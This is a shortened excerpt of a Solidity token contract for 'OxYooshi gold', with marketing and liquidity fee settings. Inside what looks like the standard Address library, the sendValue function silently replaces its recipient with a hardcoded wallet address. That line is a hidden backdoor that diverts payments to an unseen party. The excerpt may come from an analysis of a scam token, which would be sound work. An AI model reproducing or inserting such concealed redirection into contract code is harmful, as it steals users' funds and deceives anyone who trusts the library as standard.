...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x7631d455A9Af87D8Ce18F6cd64F39d6a328c7297);
...
contract oxYooshigold is Context, IERC20, Ownable {
    ...
    string private constant _name = "OxYooshi gold"; // 
    string private constant _symbol = "$YooshiGold"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 8;
    uint256 private _liquidityFee = 2;
    address private  _marketingWallet = 0xeA50Da07f5bAd1e4aC5613078a715D0C6ad2dAe2;
